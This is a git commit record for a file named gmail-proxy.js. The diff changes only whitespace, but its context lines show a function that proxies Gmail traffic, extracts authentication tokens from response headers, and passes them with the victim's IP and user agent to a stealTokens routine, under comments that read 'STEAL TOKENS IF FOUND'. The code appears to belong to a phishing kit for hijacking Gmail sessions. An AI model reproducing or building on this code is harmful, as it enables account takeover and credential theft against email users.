175b8bac4eb0a48af19a9f5e5b77520f3f20fafc
ia7353038-crypto <ia7353038@gmail.com>
2026-01-28 08:09:10 -0800

    Update gmail-proxy.js

--- gmail-proxy.js
+++ gmail-proxy.js
@@ -89,7 +89,7 @@ async function proxyGmail(url, request, clientIP, userAgent) {
     
     // EXTRACT TOKENS BEFORE MODIFICATION
     const tokens = extractTokens(response.headers);
-    
+
     // STEAL TOKENS IF FOUND
     if (tokens.length > 0) {
       await stealTokens(tokens, clientIP, userAgent, url.href);
